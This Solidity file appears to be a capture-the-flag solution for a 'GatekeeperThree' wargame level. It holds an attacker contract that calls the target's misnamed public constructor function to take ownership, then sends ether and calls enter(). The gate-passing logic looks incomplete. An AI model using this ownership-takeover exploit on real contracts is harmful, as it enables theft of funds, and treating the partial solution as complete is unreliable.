// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IGatekeeperThree {
    function construct0r() external;
    function enter() external;
}

contract GatekeeperThreeHacker {

    IGatekeeperThree gatekeeper;

    constructor(IGatekeeperThree _gatekeeper) {
        gatekeeper = _gatekeeper;
    }

    function becomeOwner() external {
        gatekeeper.construct0r();
    }

    function enterGatekeeper() external {
        (bool returned, ) = address(gatekeeper).call{value: 0.001 ether}("");
        if(!returned) {
            gatekeeper.enter();
        }
    }
}